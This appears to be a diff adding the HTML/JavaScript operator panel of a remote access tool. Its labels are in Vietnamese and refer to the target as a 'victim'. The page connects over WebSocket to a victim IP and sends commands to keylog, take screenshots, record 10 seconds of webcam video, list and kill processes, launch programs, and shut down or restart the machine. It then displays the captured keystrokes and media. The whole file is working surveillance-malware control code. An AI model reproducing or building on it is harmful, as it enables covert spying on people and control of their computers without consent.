@@ -1,0 +1,84 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <title>HACKER EDGE CONTROLLER</title>
+    <style>
+        body { background: #000; color: #00ffff; font-family: monospace; text-align: center; padding: 20px; }
+        .box { border: 2px solid #00ffff; padding: 20px; max-width: 800px; margin: 0 auto; }
+        input { padding: 10px; width: 200px; text-align: center; font-weight: bold; }
+        button { background: #000; color: #00ffff; border: 1px solid #00ffff; padding: 10px 20px; cursor: pointer; margin: 5px; font-weight: bold; }
+        button:hover { background: #00ffff; color: #000; }
+        .red { border-color: red; color: red; } .red:hover { background: red; color: white; }
+        #log { height: 300px; overflow-y: scroll; text-align: left; border: 1px dashed #333; margin-top: 15px; padding: 10px; background: #111; white-space: pre-wrap; color: #fff; }
+        img, video { max-width: 100%; margin-top: 10px; border: 1px solid #00ffff; }
+    </style>
+</head>
+<body>
+    <h1>☠️ REMOTE ACCESS TOOL (EDGE VERSION) ☠️</h1>
+    <div class='box'>
+        <h3>KẾT NỐI MỤC TIÊU</h3>
+        IP Nạn Nhân: <input type='text' id='ip' value='127.0.0.1'>
+        <button onclick='connect()'>KẾT NỐI</button>
+        <div id='status' style='margin-top:10px; color:gray'>TRẠNG THÁI: CHƯA KẾT NỐI</div>
+    </div>
+    
+    <div id='controls' class='box' style='display:none; margin-top:20px'>
+        <button onclick="send('LIST_APP')">List App</button>
+        <button onclick="send('KEYLOG')">Keylog</button>
+        <button onclick="send('SCREENSHOT')">Screenshot</button>
+        <button onclick="send('WEBCAM')">Webcam (10s)</button>
+        <br><br>
+        <button class='red' onclick="if(confirm('Chắc chưa?')) send('SHUTDOWN')">SHUTDOWN</button>
+        <button class='red' onclick="if(confirm('Chắc chưa?')) send('RESTART')">RESTART</button>
+        <hr>
+        App: <input id='appName' placeholder='notepad' style='width:100px'> <button onclick="startApp()">Open</button>
+        | Kill ID: <input id='killId' style='width:60px'> <button class='red' onclick="killApp()">Kill</button>
+    </div>
+
+    <div id='media'></div>
+    <div id='log'>System Ready...</div>
+
+    <script>
+        let ws;
+        function log(m) { let d=document.getElementById('log'); d.innerText+='\n'+m; d.scrollTop=d.scrollHeight; }
+        function connect() {
+            let ip = document.getElementById('ip').value;
+            let url = 'ws://' + ip + ':8080';
+            log('Connecting to ' + url + '...');
+            try {
+                ws = new WebSocket(url);
+                ws.onopen = function() {
+                    document.getElementById('status').innerText = 'ONLINE';
+                    document.getElementById('status').style.color = '#00ffff';
+                    document.getElementById('controls').style.display = 'block';
+                    log('>> CONNECTED!');
+                };
+                ws.onclose = function() {
+                    document.getElementById('status').innerText = 'OFFLINE';
+                    document.getElementById('status').style.color = 'red';
+                    document.getElementById('controls').style.display = 'none';
+                    log('>> DISCONNECTED');
+                };
+                ws.onmessage = function(e) {
+                    let d = e.data;
+                    if(d.startsWith('IMG|')) document.getElementById('media').innerHTML=`<img src='data:image/jpeg;base64,${d.substring(4)}'>`;
+                    else if(d.startsWith('VID|')) document.getElementById('media').innerHTML=`<video controls autoplay src='data:video/avi;base64,${d.substring(4)}'></video>`;
+                    else if(d.startsWith('KEYLOG|')) log('KEYLOG:\\n'+d.substring(7));
+                    else if(d.startsWith('LIST_APP|')) renderList(d.substring(9));
+                    else log(d);
+                };
+            } catch(e) { alert('IP Error: ' + e); }
+        }
+        function send(c) { if(ws && ws.readyState==1) ws.send(c); else alert('Disconnected!'); }
+        function startApp() { send('START|'+document.getElementById('appName').value); }
+        function killApp() { send('KILL|'+document.getElementById('killId').value); }
+        function renderList(d) {
+            let h='<table border=1 width=100%><tr><th>ID</th><th>Name</th></tr>';
+            d.split(';').forEach(r=>{ if(r) { let p=r.split(','); h+=`<tr><td>${p[0]}</td><td>${p[1]}</td></tr>`; }});
+            document.getElementById('log').innerHTML=h+'</table>';
+        }
+    </script>
+</body>
+</html>
